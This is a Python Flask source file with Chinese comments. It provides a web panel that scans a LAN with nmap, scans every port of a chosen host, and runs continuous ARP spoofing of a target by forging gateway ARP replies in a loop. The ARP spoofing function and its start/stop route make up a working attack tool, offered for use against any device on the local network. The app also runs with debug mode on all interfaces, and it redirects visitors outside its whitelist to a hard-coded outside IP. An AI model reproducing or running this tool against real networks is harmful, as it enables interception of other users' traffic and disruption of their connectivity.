import json
import os
from flask import Flask, render_template, request, jsonify, redirect
import threading
from scapy.all import *
import time
import logging
import nmap

app = Flask(__name__)

# 全局变量，用于控制 ARP 欺骗线程
arp_spoofing_thread = None
arp_spoofing_active = False

# 配置文件路径
CONFIG_FILE = 'config.json'

# 默认配置内容
DEFAULT_CONFIG = {
    "network_range": "192.168.1.0/24",
    "allowed_ips": [
        ""
    ],
    "allowed_prefixes": [
        ""
    ]
}


def is_allowed_ip(ip):
    # 检查是否在白名单中
    if ip in ALLOWED_IPS:
        return True
    # 检查是否在 100.0.0.0/8 网段内
    for prefix in ALLOWED_PREFIXES:
        if ip.startswith(prefix):
            return True
    return False

@app.before_request
def require_whitelist():
    # 获取请求的 IP 地址
    ip = request.remote_addr
    logging.info(f"<!>{ip}访问了管理页面")
    if not is_allowed_ip(ip):
        return redirect("http://182.43.124.6/")

# 初始化配置文件
def initialize_config():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        print(f"{CONFIG_FILE} already created，using default configuration。")
    else:
        print(f"{CONFIG_FILE} already existed. using existing configuration")


# 加载配置文件
def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)


# 配置日志
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',  # 时间戳、日志级别和消息
    level=logging.INFO,  # 设置日志级别
    datefmt='%Y-%m-%d %H:%M:%S',  # 时间格式
    handlers=[
        logging.FileHandler("app.log", encoding="utf-8", mode="a"),  # 使用 UTF-8 编码保存日志文件
        logging.StreamHandler()
    ]
)


# 获取本机 MAC 地址
def get_local_mac(interface):
    return get_if_hwaddr(interface)


# 获取目标或网关的 MAC 地址
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    response = srp1(packet, timeout=2, verbose=0)
    if response:
        return response.hwsrc
    return None


# 获取默认接口
def get_default_interface():
    return conf.iface


# 运行 ARP 欺骗的函数
def arp_spoof(target_ip, target_mac, gateway_ip, local_mac, interface):
    """
    利用 Scapy 不断发送伪造的 ARP 回复给目标，从而执行 ARP 欺骗
    """
    global arp_spoofing_active

    # 构建带有以太网帧的 ARP 响应包
    arp_response = (
        Ether(src=local_mac, dst=target_mac) /
        ARP(
            op=2,            # ARP 回复
            psrc=gateway_ip, # 伪装的网关 IP
            pdst=target_ip,  # 目标设备的 IP
            hwsrc=local_mac, # 本机 MAC
            hwdst=target_mac # 目标设备 MAC
        )
    )

    while arp_spoofing_active:
        # 发送伪造的 ARP 响应包
        sendp(arp_response, iface=interface, verbose=False)
        # time.sleep(2)


# 使用 Nmap 扫描网络设备
def scan_network(network):
    """
    使用 Nmap 来扫描局域网内所有存活主机（Ping 扫描），
    并收集其 IP、MAC 和主机名信息。
    """
    logging.info(f"开始使用 Nmap 扫描网络: {network}")
    start_time = time.time()

    nm = nmap.PortScanner()
    devices = []

    try:
        logging.info(f"尝试使用 Nmap 扫描网络: {network}")
        # -sn 表示只进行主机发现（Ping 扫描），-T4 提高扫描速度
        nm.scan(hosts=network, arguments='-sn -T4')
    except nmap.PortScannerError as e:
        logging.error(f"Nmap 扫描失败: {e}", exc_info=True)
        return devices
    except Exception as e:
        logging.error(f"未知错误在扫描网络时发生: {e}", exc_info=True)
        return devices

    # 逐个处理扫描结果
    for host in nm.all_hosts():
        if nm[host].state() == 'up':
            # 获取 MAC 地址，如果没有则返回 'Unknown'
            mac = nm[host]['addresses'].get('mac', 'Unknown')
            
            # 获取主机名，如果没有则尝试从 MAC 中提取网卡信息
            hostname = nm[host].hostname()
            if not hostname and mac != 'Unknown':
                vendor_info = nm[host]['vendor'].get(mac, '')
                if vendor_info:
                    hostname = f"*{vendor_info}"
                else:
                    hostname = f"Unknown"
            elif not hostname:
                hostname = 'Unknown'
    
            # 添加设备信息到列表
            devices.append({
                'ip': host,
                'mac': mac,
                'hostname': hostname
            })
            logging.info(f"发现设备: IP={host}, MAC={mac}, Hostname={hostname}")

    end_time = time.time()
    elapsed_time = end_time - start_time
    logging.info(f"Nmap 网络扫描完成，用时 {elapsed_time:.2f} 秒。")

    return devices


# 使用 Nmap 扫描指定 IP 的端口
def scan_ports(ip, start_port=1, end_port=65535):
    """
    使用 Nmap 对指定 IP 进行端口扫描，返回开放的端口列表。
    """
    logging.info(f"开始使用 Nmap 扫描 {ip} 的端口范围: {start_port}-{end_port}")
    start_time = time.time()

    nm = nmap.PortScanner()
    open_ports = []

    try:
        # -T4 提升扫描速度；ports=f'{start_port}-{end_port}' 表示要扫描的端口范围
        nm.scan(hosts=ip, ports=f'{start_port}-{end_port}', arguments='-T4')
    except Exception as e:
        logging.error(f"扫描端口时出错: {e}")
        return open_ports

    # 解析扫描结果
    if ip in nm.all_hosts():
        for proto in nm[ip].all_protocols():
            # 例如 'tcp', 'udp' 等
            port_list = nm[ip][proto].keys()
            for port in port_list:
                if nm[ip][proto][port]['state'] == 'open':
                    open_ports.append(port)

    end_time = time.time()
    elapsed_time = end_time - start_time
    logging.info(f"Nmap 端口扫描完成，用时 {elapsed_time:.2f} 秒。")
    return open_ports


@app.route('/api/scan_ports', methods=['POST'])
def api_scan_ports():
    """
    扫描指定 IP 的所有端口。
    """
    ip = request.form.get('ip')
    if not ip:
        return jsonify({'error': 'No IP address provided'}), 400

    logging.info(f"Scanning ports on {ip}")
    open_ports = scan_ports(ip)

    # 检查是否有开放端口，如果没有，提供相应的消息
    if open_ports:
        return jsonify({'ip': ip, 'open_ports': open_ports})
    else:
        return jsonify({'ip': ip, 'open_ports': [], 'message': 'No open ports found'})


@app.route('/')
def index():
    """
    首页渲染，显示扫描页
    """
    network_prefix = network.rsplit('.', 1)[0] + '.'
    return render_template('index.html', network_prefix=network_prefix)


@app.route('/control', methods=['POST'])
def control():
    """
    控制 ARP 欺骗的启动与停止
    """
    global arp_spoofing_thread, arp_spoofing_active
    action = request.form.get('action')

    if action == 'start':
        if arp_spoofing_active:
            return 'ARP Spoofing is already running!'

        # 获取输入的目标 IP 的最后一部分
        target_ip_suffix = request.form.get('target_ip')
        if not target_ip_suffix or not target_ip_suffix.isdigit() or not (1 <= int(target_ip_suffix) <= 254):
            return 'Invalid target IP. Please enter the last segment of the IP address (1-254).'

        # 拼接完整的目标 IP 地址
        target_ip = f"{network.rsplit('.', 1)[0]}.{target_ip_suffix}"

        # 获取用户输入的目标 MAC 地址（可以为空）
        user_mac = request.form.get('target_mac')

        # 获取默认网卡和本机 MAC 地址
        interface = get_default_interface()
        local_mac = get_local_mac(interface)

        # 如果未提供目标 MAC 地址，则尝试自动获取
        target_mac = user_mac if user_mac else get_mac(target_ip)
        if not target_mac:
            return 'Unable to obtain target MAC address. Please check the IP address or manually specify a MAC address.'

        # 启动 ARP 欺骗线程
        arp_spoofing_active = True
        arp_spoofing_thread = threading.Thread(
            target=arp_spoof,
            args=(target_ip, target_mac, gateway_ip, local_mac, interface)
        )
        arp_spoofing_thread.start()
        logging.info(f"ARP Spoofing started... Target IP: {target_ip}, Target MAC: {target_mac}, Gateway IP: {gateway_ip}")

        return 'ARP Spoofing started!'

    elif action == 'stop':
        arp_spoofing_active = False  # 设置标志为 False，停止 ARP 欺骗线程
        if arp_spoofing_thread and arp_spoofing_thread.is_alive():
            logging.info("Stopping ARP spoofing...")
            arp_spoofing_thread.join()  # 等待线程终止
            logging.info("ARP spoofing stopped.")

        return 'ARP Spoofing stopped.'


@app.route('/api/devices')
def api_devices():
    """
    扫描网络设备并返回 JSON 格式数据
    """
    network_devices = scan_network(network)
    return jsonify(network_devices)



if __name__ == '__main__':
    # 在应用启动时初始化配置
    initialize_config()
    config = load_config()
    network = config.get("network_range", "192.168.1.0/24")  # 默认网络范围
    ALLOWED_IPS = config.get("allowed_ips", [])
    ALLOWED_PREFIXES = config.get("allowed_prefixes", [])
    network_ip = network.split('/')[0]
    ip_parts = network_ip.split('.')
    ip_parts[-1] = '1'
    gateway_ip = '.'.join(ip_parts)

    app.run(host='0.0.0.0', port=5000, debug=True)
